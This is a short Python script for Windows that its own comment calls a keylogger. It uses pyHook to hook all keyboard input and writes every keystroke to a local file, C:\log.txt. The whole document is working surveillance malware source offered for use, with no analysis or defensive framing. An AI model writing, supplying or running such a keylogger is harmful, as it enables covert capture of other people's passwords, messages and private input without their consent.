# Python code for keylogger 
# to be used in windows 
import pythoncom, pyHook, sys, logging

log_file = 'C:\\log.txt'  
def OnKeyboardEvent(event):
    logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True 
# create a hook manager object 
hm = pyHook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
hm.HookKeyboard() 
pythoncom.PumpMessages()